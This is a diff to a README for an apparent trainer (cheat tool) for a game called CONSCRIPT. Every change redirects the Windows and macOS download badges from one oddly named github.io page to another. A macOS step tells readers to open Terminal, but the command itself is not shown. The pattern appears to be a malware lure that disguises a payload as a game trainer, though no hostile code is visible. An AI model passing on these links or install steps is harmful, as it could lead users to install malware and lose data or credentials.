@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download CONSCRIPT Trainer](https://img.shields.io/badge/⬇_Download_CONSCRIPT_Trainer-E63946?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
+[![⬇ Download CONSCRIPT Trainer](https://img.shields.io/badge/⬇_Download_CONSCRIPT_Trainer-E63946?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
 
 </div>
 
@@ -74,9 +74,9 @@ CONSCRIPT is a harrowing survival horror game set during the Battle of Verdun in
 
 <div align="center">
 
-[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
+[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WaterCongressman.github.io/win-download/)
 
-[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
+[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WaterCongressman.github.io/mac-download/)
 
 </div>
 
@@ -97,7 +97,7 @@ CONSCRIPT is a harrowing survival horror game set during the Battle of Verdun in
 
 <div align="center">
 
-[![⬇ Download CONSCRIPT Trainer](https://img.shields.io/badge/⬇_Download_CONSCRIPT_Trainer-E63946?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
+[![⬇ Download CONSCRIPT Trainer](https://img.shields.io/badge/⬇_Download_CONSCRIPT_Trainer-E63946?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
 
 </div>
 
@@ -129,7 +129,7 @@ CONSCRIPT is a harrowing survival horror game set during the Battle of Verdun in
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WaterCongressman.github.io/mac-download/)
 
 1. Click the badge above to open the macOS trainer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -154,7 +154,7 @@ CONSCRIPT is a harrowing survival horror game set during the Battle of Verdun in
 
 <div align="center">
 
-[![⬇ Download CONSCRIPT Trainer](https://img.shields.io/badge/⬇_Download_CONSCRIPT_Trainer-E63946?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
+[![⬇ Download CONSCRIPT Trainer](https://img.shields.io/badge/⬇_Download_CONSCRIPT_Trainer-E63946?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
 
 </div>
 
